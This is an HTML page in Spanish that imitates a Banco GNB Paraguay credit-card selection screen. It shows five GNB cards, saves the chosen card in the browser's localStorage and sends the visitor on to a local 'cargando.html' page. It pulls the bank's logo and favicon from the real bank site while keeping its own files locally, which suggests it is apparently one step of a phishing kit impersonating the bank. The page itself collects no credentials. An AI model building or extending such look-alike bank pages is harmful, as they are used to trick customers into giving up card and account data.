<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>GNB :: Seleccioná tu tarjeta</title>
<link rel="icon" href="https://www.bancognb.com.py/bancaweb/img/favicon.ico" type="image/icon">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700&display=swap">
<style>
body{background:#EDEDED;font-family:'Open Sans',sans-serif;margin:0;min-width:320px;}
.caja{background:#fff;max-width:820px;margin:20px auto 26px;padding:0 0 26px;box-shadow:0 1px 4px rgba(0,0,0,.09);}
.tope{text-align:right;padding:8px 16px 0;font-size:20px;}
.tope a{color:#0574AF;text-decoration:none;}
.logo{text-align:center;padding:2px 0 10px;}
.logo img{max-width:210px;height:auto;}
h1{font-size:22px;font-weight:600;color:#7AB83F;text-align:center;margin:0 0 4px;letter-spacing:-.3px;}
.sub{text-align:center;color:#6d7275;font-size:13px;margin:0 20px 20px;}
.lista{display:flex;flex-wrap:wrap;justify-content:center;gap:16px;padding:0 22px;}
@media(max-width:700px){.lista{gap:12px;padding:0 14px;}}
.card{position:relative;cursor:pointer;flex:0 0 calc(33.333% - 11px);border-radius:12px;}
@media(max-width:700px){.card{flex:0 0 calc(50% - 6px);}}
.card .marco{position:relative;width:100%;aspect-ratio:1.6/1;border-radius:12px;display:flex;align-items:center;justify-content:center;}
.card .marco .fondo{position:absolute;inset:0;border-radius:12px;background:#f6f7f6;}
.card .marco img{position:relative;width:100%;height:100%;object-fit:contain;display:block;filter:drop-shadow(0 4px 9px rgba(0,0,0,.20));}
.card .marco:after{content:"";position:absolute;inset:0;border-radius:12px;border:3px solid transparent;transition:.15s;pointer-events:none;}
.card:hover .marco:after{border-color:rgba(122,184,63,.5);}
.card.sel .marco:after{border-color:#7AB83F;box-shadow:inset 0 0 0 3px rgba(122,184,63,.22);}
.card .tick{position:absolute;top:6px;left:6px;width:22px;height:22px;border-radius:50%;background:#7AB83F;color:#fff;font-size:13px;line-height:22px;text-align:center;display:none;font-weight:700;z-index:3;box-shadow:0 2px 6px rgba(0,0,0,.3);}
.card.sel .tick{display:block;}
.card .nom{font-size:11.5px;font-weight:600;color:#22302b;text-align:center;margin-top:7px;line-height:1.25;}
.card .tipo{font-size:10px;color:#8a8d8f;text-align:center;}
.btn{display:block;width:calc(100% - 44px);margin:22px auto 0;background:#0574AF;color:#fff;border:0;height:46px;font-size:15px;font-weight:600;cursor:pointer;font-family:inherit;}
.btn:hover{background:#046290;}
.btn:disabled{background:#9fb6c4;cursor:default;}
.pie{text-align:center;font-size:11px;color:#8a8d8f;margin-top:12px;}
</style>
</head>
<body>
<div class="caja">
  <div class="tope"><a href="https://www.bancognb.com.py/public/">X</a></div>
  <div class="logo"><img src="https://www.bancognb.com.py/bancaweb/img/brand/new-logo-gnb-fusion.svg" alt="GNB"></div>

  <h1>Seleccioná tu tarjeta de crédito</h1>
  <p class="sub">Elegí la tarjeta con la que querés continuar la solicitud.</p>

  <div class="lista" id="lista">

    <div class="card" data-n="GNB Classic">
      <div class="tick">✓</div>
      <div class="marco"><div class="fondo"></div>
        <img src="tarjetas/clasica.png" alt="GNB Classic">
      </div>
      <div class="nom">GNB Classic</div><div class="tipo">Crédito</div>
    </div>

    <div class="card" data-n="GNB Gold">
      <div class="tick">✓</div>
      <div class="marco"><div class="fondo"></div>
        <img src="tarjetas/oro.png" alt="GNB Gold">
      </div>
      <div class="nom">GNB Gold</div><div class="tipo">Crédito</div>
    </div>

    <div class="card" data-n="GNB Platinum">
      <div class="tick">✓</div>
      <div class="marco"><div class="fondo"></div>
        <img src="tarjetas/platino.png" alt="GNB Platinum">
      </div>
      <div class="nom">GNB Platinum</div><div class="tipo">Crédito</div>
    </div>

    <div class="card" data-n="GNB Experience">
      <div class="tick">✓</div>
      <div class="marco"><div class="fondo"></div>
        <img src="tarjetas/azul.png" alt="GNB Experience">
      </div>
      <div class="nom">GNB Experience</div><div class="tipo">Crédito</div>
    </div>

    <div class="card" data-n="GNB Black">
      <div class="tick">✓</div>
      <div class="marco"><div class="fondo"></div>
        <img src="tarjetas/black.png" alt="GNB Black">
      </div>
      <div class="nom">GNB Black</div><div class="tipo">Crédito</div>
    </div>

  </div>

  <button class="btn" id="solicitar" type="button" disabled>Solicitar</button>
</div>

<script>
var elegida = null;
document.getElementById('lista').addEventListener('click', function(ev){
  var c = ev.target.closest('.card');
  if (!c) return;
  [].forEach.call(document.querySelectorAll('.card'), function(x){ x.classList.remove('sel'); });
  c.classList.add('sel');
  elegida = c.getAttribute('data-n');
  document.getElementById('solicitar').disabled = false;
});

document.getElementById('solicitar').addEventListener('click', function(){
  if (!elegida) return;
  try { localStorage.setItem('gnb_tarjeta', elegida); } catch(e){}
  window.location.href = 'cargando.html';
});
</script>
</body>
</html>
